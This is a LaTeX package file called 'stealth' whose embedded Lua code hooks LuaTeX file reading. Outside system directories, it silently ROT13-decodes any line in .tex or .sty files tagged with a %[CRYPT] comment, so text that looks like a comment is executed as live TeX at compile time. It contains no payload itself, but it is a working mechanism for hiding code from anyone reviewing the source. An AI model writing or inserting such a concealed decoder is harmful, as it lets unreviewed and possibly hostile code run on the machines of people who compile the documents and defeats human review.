\NeedsTeXFormat{LaTeX2e}
\ProvidesPackage{stealth}
\RequirePackage{luacode}
\begin{luacode*}
local function rot13_decode(line)
    return (line:gsub("[a-zA-Z]", function(c)
        local base = c:lower() == c and 97 or 65
        return string.char(((c:byte() - base + 13) % 26) + base)
    end))
end
-- Completely ignore internal macro scripts and format sheets
luatexbase.add_to_callback("open_read_file", function(env)
    if env.filename and (env.filename:find("%.tex$") or env.filename:find("%.sty$")) then
        if not env.filename:find("/usr/share") then
            local original_reader = env.reader
            env.reader = function()
                local line = original_reader()
                if line and line:find("%%%[CRYPT%]") then
                    return rot13_decode(line:gsub("%%%[CRYPT%]", ""))
                end
                return line
            end
        end
    end
end, "StrictLocalDecoder")
\end{luacode*}
\endinput
